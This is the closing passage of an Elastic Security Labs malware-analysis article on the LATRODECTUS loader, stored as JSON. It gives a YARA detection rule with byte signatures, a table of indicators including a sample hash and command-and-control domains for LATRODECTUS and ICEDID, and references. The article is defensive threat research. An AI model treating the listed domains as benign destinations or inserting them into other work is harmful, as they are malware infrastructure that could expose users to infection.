triggering on the LATRODECTUS [memory signature](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar):   \n\n![Memory signatures against LATRODECTUS via Elastic Defend](/assets/images/spring-cleaning-with-latrodectus/image23.png)\n\n\n### YARA\n\nElastic Security has created YARA rules to identify [LATRODECTUS](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar):\n\n```\nrule Windows_Trojan_LATRODECTUS_841ff697 {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-03-13\"\n        last_modified = \"2024-04-05\"\n        license = \"Elastic License v2\"\n         os = \"Windows\"\n        arch = \"x86\"\n        threat_name = \"Windows.Trojan.LATRODECTUS\"\n        reference_sample = \"aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c\"\n\n\n    strings:\n        $Str1 = { 48 83 EC 38 C6 44 24 20 73 C6 44 24 21 63 C6 44 24 22 75 C6 44 24 23 62 C6 44 24 24 }\n        $crc32_loadlibrary = { 48 89 44 24 40 EB 02 EB 90 48 8B 4C 24 20 E8 ?? ?? FF FF 48 8B 44 24 40 48 81 C4 E8 02 00 00 C3 }\n        $delete_self = { 44 24 68 BA 03 00 00 00 48 8B 4C 24 48 FF 15 ED D1 00 00 85 C0 75 14 48 8B 4C 24 50 E8 ?? ?? 00 00 B8 FF FF FF FF E9 A6 00 }\n        $Str4 = { 89 44 24 44 EB 1F C7 44 24 20 00 00 00 00 45 33 C9 45 33 C0 33 D2 48 8B 4C 24 48 FF 15 7E BB 00 00 89 44 24 44 83 7C 24 44 00 75 02 EB 11 48 8B 44 24 48 EB 0C 33 C0 85 C0 0F 85 10 FE FF FF 33 }\n        $handler_check = { 83 BC 24 D8 01 00 00 12 74 36 83 BC 24 D8 01 00 00 0E 74 2C 83 BC 24 D8 01 00 00 0C 74 22 83 BC 24 D8 01 00 00 0D 74 18 83 BC 24 D8 01 00 00 0F 74 0E 83 BC 24 D8 01 00 00 04 0F 85 44 02 00 00 }\n        $hwid_calc = { 48 89 4C 24 08 48 8B 44 24 08 69 00 0D 66 19 00 48 8B 4C 24 08 89 01 48 8B 44 24 08 8B 00 C3 }\n        $string_decrypt = { 89 44 24 ?? 48 8B 44 24 ?? 0F B7 40 ?? 8B 4C 24 ?? 33 C8 8B C1 66 89 44 24 ?? 48 8B 44 24 ?? 48 83 C0 ?? 48 89 44 24 ?? 33 C0 66 89 44 24 ?? EB ?? }\n        $campaign_fnv = { 48 03 C8 48 8B C1 48 39 44 24 08 73 1E 48 8B 44 24 08 0F BE 00 8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01 89 04 24 EB BE }\n    condition:\n        2 of them\n}\n```\n\n## Observations\n\nThe following observables were discussed in this research.\n\n| Observable | Type | Name | Reference |\n| --- | --- | --- | --- |\n| aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c | SHA-256 | TRUFOS.DLL | LATRODECTUS |\n| aytobusesre.com | domain | | LATRODECTUS C2 |\n| scifimond.com | domain | | LATRODECTUS C2 |\n| gyxplonto.com | domain | | ICEDID C2 |\n| neaachar.com | domain | | ICEDID C2 |\n\n## References\nThe following were referenced throughout the above research:\n\n - [https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39)\n - [https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice](https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice)\n\n## Tooling\n[String decryption and IDA commenting tool](https://github.com/elastic/labs-releases/blob/main/tools/latrodectus/latro_str_decrypt.py)\n"
    },
    "title": "Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID",
    "slug": "spring-cleaning-with-latrodectus",
    "subtitle": "The LATRODECTUS loader evolves to deliver ICEDID and other malware",
    "date": "2024-05-16",
    "description": "Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market.",
    "author": [
      {
        "slug": "daniel-stepanic"
      },
      {
        "slug": "samir-bousseaden"
      }
    ],
    "image": "Security Labs Images 16.jpg",
    "category": [
      {
        "slug": "malware-analysis"
      }
    ],
    "tags": [
      "icedid",
      "latrodectus",
      "loader"
    ]
  },
  "id": "security_labs_content-spring_cleaning_with_latrodectus-md",
  "type": "security_labs_content"
}
